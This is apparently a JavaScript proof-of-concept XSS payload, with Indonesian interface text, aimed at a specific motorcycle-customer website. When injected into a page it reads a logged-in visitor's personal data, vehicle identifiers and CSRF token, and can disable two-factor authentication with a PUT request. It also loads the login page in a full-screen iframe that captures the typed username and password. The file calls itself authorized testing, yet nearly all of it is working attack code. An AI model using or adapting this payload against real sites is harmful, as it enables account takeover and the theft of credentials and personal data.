/*
 * xss-demo.js — SECURITY DEMO (authorized testing only)
 *
 * Generic demonstration payload for an authorized XSS proof-of-concept.
 * It proves that externally hosted JavaScript can:
 *  - show session data when the visitor is logged in
 *  - toggle a security setting (2FA) with an explicit confirmation
 *  - display cookie/CSRF visibility (HttpOnly tokens must stay hidden)
 *  - render a demo login form with a local keylogger when logged out
 *
 * The page reflects the payload into several attributes, so this file may be
 * requested/injected more than once. The script is idempotent: only the first
 * execution builds the UI, later executions increment a counter and return.
 *
 * No data leaves the page and nothing is stored.
 */
(function() {
    'use strict';
    if (window.__DEMO_POC__) {
        window.__DEMO_EXEC_COUNT__ = (window.__DEMO_EXEC_COUNT__ || 1) + 1;
        return;
    }
    window.__DEMO_POC__ = true;
    window.__DEMO_EXEC_COUNT__ = 1;

    var WARN = 'SECURITY DEMO — authorized testing only. No data is sent anywhere.';
    var HOST_ID = 'demo-poc-host';

    function el(tag, attrs, text) {
        var e = document.createElement(tag);
        if (attrs)
            for (var k in attrs) e.setAttribute(k, attrs[k]);
        if (text != null) e.textContent = text;
        return e;
    }

    function get(url) {
        return fetch(url, {
                credentials: 'same-origin',
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            })
            .then(function(r) {
                return r.text().then(function(t) {
                    return {
                        status: r.status,
                        body: t
                    };
                });
            });
    }

    function b64decode(s) {
        try {
            return decodeURIComponent(escape(atob(s)));
        } catch (e) {
            return s;
        }
    }

    function uniq(a) {
        return a.filter(function(v, i) {
            return a.indexOf(v) === i;
        });
    }

    function csrf() {
        try {
            return (window.ACC && ACC.config && ACC.config.CSRFToken) || '';
        } catch (e) {
            return '';
        }
    }

    var host = el('div', {
        id: HOST_ID,
        style: 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center;font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif'
    });
    var shadow = host.attachShadow ? host.attachShadow({
        mode: 'open'
    }) : host;
	var box = el('div', { style: 'width:min(760px,92vw);max-height:88vh;overflow:auto;background:#fff;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,.4);color:#1f2328' });
	var head = el('div', {style: 'padding:12px 16px;border-bottom:1px solid #e5e7eb;display:flex;align-items:center;justify-content:space-between;gap:12px'});
	head.appendChild(el('div', {style: 'font-weight:700;font-size:14px'},'Security Demo v4 (XSS PoC) — ' + location.host));
	var headBtns = el('div', {style: 'display:flex;gap:8px'});
	var minBtn = el('button', {style: 'border:1px solid #d0d7de;background:#f6f8fa;color:#1f2328;border-radius:8px;padding:6px 10px;cursor:pointer;font-size:12.5px'}, 'Hidden');
	var closeBtn = el('button', {style: 'border:0;background:#111;color:#fff;border-radius:8px;padding:6px 10px' +';cursor:pointer;font-size:12.5px'}, 'Close');
	var showButton = document.createElement('button');
		showButton.textContent = 'XSS PoC';
	Object.assign(showButton.style, {
		display: 'none',
		position: 'fixed',
		top: '20px',
		left: '20px',
		zIndex: '2147483647',
		padding: '7px 30px',
		backgroundColor: '#910707',
		color: '#fff',
		border: 'medium',
		borderRadius: '20px',
		fontSize: '12px',
		fontWeight: 'bold',
		cursor: 'pointer'
	});
	showButton.addEventListener('click', () => {
		document.getElementById(HOST_ID).style.display = "flex";
		showButton.style.display = "none";
	});
	document.body.appendChild(showButton);
	headBtns.appendChild(minBtn);
	headBtns.appendChild(closeBtn);
	minBtn.onclick = function() {
		document.getElementById(HOST_ID).style.display="none";
		showButton.style.display = "block";
    };
	closeBtn.onclick = function() {
		//sessionStorage.clear();
        host.remove();
        window.__DEMO_POC__ = false;
    };
	head.appendChild(headBtns);
	
    var warn = el('div', {
        style: 'margin:12px 18px;padding:10px 12px;background:#fff4e5;border-left:4px solid #b35900;border-radius:6px;font-size:12.5px;color:#7a3d00'
    }, WARN);
    var info = el('div', {
            style: 'margin:0 18px 12px;padding:10px 12px;background:#eef6ff;border-left:4px solid #0969da;border-radius:6px;font-size:12.5px;color:#0a3069'
        },
        'Hanya demonstrasi: UI ini sengaja ditampilkan agar dampak terlihat. Pada kasus nyata, skrip yang sama dapat berjalan tanpa UI (tersembunyi) sehingga pengunjung/target tidak menyadari bahwa data sedang dibaca atau diubah.');
    var body = el('div', {
        style: 'padding:0 18px 18px'
    });
    var note = el('div', {
        style: 'margin-top:12px;font-size:12.5px;color:#57606a'
    }, '');
    var out = el('pre', {
        style: 'background:#0d1117;color:#e6edf3;padding:12px;border-radius:8px;font-size:12px;white-space:pre-wrap;word-break:break-word;max-height:300px;overflow:auto;margin:12px 0 0'
    }, '');
    var actions = el('div', {
        style: 'display:flex;flex-wrap:wrap;gap:8px;margin-top:12px'
    });

    function btn(label, fn, danger, disabled) {
        var b = el('button', {
            style: 'border:1px solid ' + (danger ? '#cf222e' : '#d0d7de') + ';background:' + (danger ? '#cf222e' : '#f6f8fa') + ';color:' + (danger ? '#fff' : '#1f2328') + ';border-radius:8px;padding:9px 12px;font-size:13px;cursor:pointer'
        }, label);
        if (disabled) {
            b.setAttribute('disabled', 'disabled');
            b.style.opacity = '0.45';
            b.style.cursor = 'not-allowed';
            b.title = 'Nonaktif: aktif otomatis jika pengunjung dalam keadaan login.';
        }
        b.onclick = function() {
            if (disabled && label !=="Login") {
                say('Tombol nonaktif. Jika target login, tombol ini akan aktif otomatis (skrip memeriksa status sesi).');
                return;
            }
            fn(b);
        };
        actions.appendChild(b);
        return b;
    }

    function setNote(loggedIn) {
        note.textContent = loggedIn ? 'Sesi login terdeteksi — tombol aksi AKTIF (mode demo). Pada kasus nyata UI ini dapat disembunyikan sepenuhnya.' : 'Tombol aksi DINONAKTIFKAN karena pengunjung belum login. Jika target login, tombol ini akan AKTIF otomatis (status sesi diperiksa oleh skrip).';
    }

    function say(s) {
        out.textContent = typeof s === 'string' ? s : JSON.stringify(s, null, 2);
    }

    box.appendChild(head);
    box.appendChild(warn);
    box.appendChild(info);
    box.appendChild(body);
    body.appendChild(actions);
    body.appendChild(out);
    body.appendChild(note);
    shadow.appendChild(box);

    function showPersonal() {
        say('Loading…');
        Promise.all([get('/get-current-customer'), get('/base64-data'), get('/my-account/my-vehicles')]).then(function(r) {
            var cust = {},
                b64 = {};
            try {
                cust = JSON.parse(r[0].body);
            } catch (e) {}
            try {
                b64 = JSON.parse(r[1].body);
            } catch (e) {}
            var html = r[2].body || '';
            var ids = [],
                m, re = /set-primary-vehicle\?id=([A-Za-z0-9]+)/g;
            while ((m = re.exec(html))) ids.push(m[1]);
            ids = uniq(ids).slice(0, 3);
            var base = {
                uid: cust.uid,
                name: cust.name,
                phone: cust.customerPhone,
                email_b64: b64.userEmail,
                email: b64.userEmail ? b64decode(b64.userEmail) : null,
                name_b64: b64.userName,
                name_decoded: b64.userName ? b64decode(b64.userName) : null,
                phone_b64: b64.userPhoneNo,
                phone_decoded: b64.userPhoneNo ? b64decode(b64.userPhoneNo) : null,
                csrfToken: csrf()
            };
            if (!ids.length) {
                base.vehicles = {
                    note: 'vehicleId not found in the account page HTML',
                    engines: uniq(html.match(/JM02E-\d+/g) || []),
                    vins: uniq(html.match(/MH1[A-Z0-9]{10,}/g) || [])
                };
                say(base);
                return;
            }
            Promise.all(ids.map(function(id) {
                    return get('/get-customer-vehicle?id=' + encodeURIComponent(id)).then(function(x) {
                        try {
                            return JSON.parse(x.body);
                        } catch (e) {
                            return {
                                id: id,
                                httpStatus: x.status,
                                raw: String(x.body).slice(0, 200)
                            };
                        }
                    });
                })).then(function(vehicles) {
                    base.vehicles = vehicles;
                    say(base);
                })
                .catch(function(e) {
                    base.vehicles = {
                        error: String(e)
                    };
                    say(base);
                });
        }).catch(function(e) {
            say('Failed: ' + e);
        });
    }

    function showState() {
        say('Loading security state…');
        get('/my-account/security/2fa').then(function(r) {
            var m = (r.body || '').match(/currentTwoFAState[^>]*value="([^"]+)"/);
            say({
                httpStatus: r.status,
                currentTwoFAState: m ? m[1] : 'not found',
                note: 'Value read from the visitor account page.'
            });
        }).catch(function(e) {
            say('Failed: ' + e);
        });
    }

    function disable2fa() {
        if (!confirm('DEMO: disable 2FA on the currently logged-in account. Continue?')) return;
        get('/csrf').then(function(r) {
            var t = (r.body || '').replace(/"/g, '');
            return fetch('/my-account/security/2fa', {
                method: 'PUT',
                credentials: 'same-origin',
                headers: {
                    'Content-Type': 'application/json',
                    'CSRFToken': t,
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify({
                    isMFAEnabled: 'false'
                })
            }).then(function(x) {
                return x.text().then(function(b) {
                    return {
                        status: x.status,
                        body: b
                    };
                });
            });
        }).then(function(res) {
            say({
                action: 'PUT /my-account/security/2fa',
                result: res,
                note: 'Only session + CSRF required; no password/TOTP.'
            });
        }).catch(function(e) {
            say('Failed: ' + e);
        });
    }

    function showCookies() {
        say({
            document_cookie: document.cookie || '(empty)',
            note: 'Session tokens are HttpOnly and must NOT appear here.',
            csrfToken: csrf(),
            userAgent: navigator.userAgent
        });
    }

    function loginPage() {
		get('https://www.motorkux.id/delete-fcm-token?token=&firebaseUid=');
		var user = sessionStorage.getItem('user');
		var pass = sessionStorage.getItem('pass');
		if(!user || !pass){
			document.getElementById('fullFrame').src = '/login';
			minBtn.click();
		}else{
			say('Email/No.HP :' + user + '\nPassword : ' + pass);
		}
    }

    function build() {
        get('/get-current-customer').then(function(r) {
            var cust = {};
            try {
                cust = JSON.parse(r.body);
            } catch (e) {}
            var loggedIn = cust && cust.uid && cust.uid !== 'anonymous';
            say(loggedIn ? ('Session detected: ' + (cust.name || cust.uid)) : 'No session detected — action buttons are disabled.');
            setNote(!!loggedIn);
            btn('Show personal data', showPersonal, false, !loggedIn);
            btn('2FA status', showState, false, !loggedIn);
            btn('Disable 2FA', disable2fa, true, !loggedIn);
            btn('Show cookies & CSRF', showCookies, false, !loggedIn);
            btn('Reload data', showPersonal, false, !loggedIn);
            btn('Login', loginPage, true);
        }).catch(function() {
            say('Could not confirm session state — action buttons are disabled.');
            setNote(false);
            btn('Show personal data', showPersonal, false, true);
            btn('2FA status', showState, false, true);
            btn('Disable 2FA', disable2fa, true, true);
            btn('Show cookies & CSRF', showCookies, false, true);
            btn('Login', loginPage, true);
        });
    }

    function createFrame() {
        history.pushState({}, "", "/");
        var frm = document.createElement('iframe');
		frm.id = 'fullFrame';
        frm.src = '/';
        frm.style = 'position:fixed;inset:0;width:100vw;height:100vh; z-index:2147483646';
        document.body.append(frm);
        frm.onload = function() {
            var docF = frm.contentDocument || frm.contentWindow.document;
            document.title = docF.title;
            var usr = docF.querySelector('#j_username');
            var pss = docF.querySelector('#j_password');
            if (usr && pss && usr.value && pss.value && !self.c) {
                sessionStorage.setItem('user', usr.value);
                sessionStorage.setItem('pass', pss.value);
            }
        };
    }

    function init() {
        if (document.getElementById(HOST_ID)) {
            window.__DEMO_POC__ = false;
            return;
        }
        (document.body || document.documentElement).appendChild(host);
        build();
        createFrame();
    }


    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init, {
            once: true
        });
    } else {
        init();
    }
})();
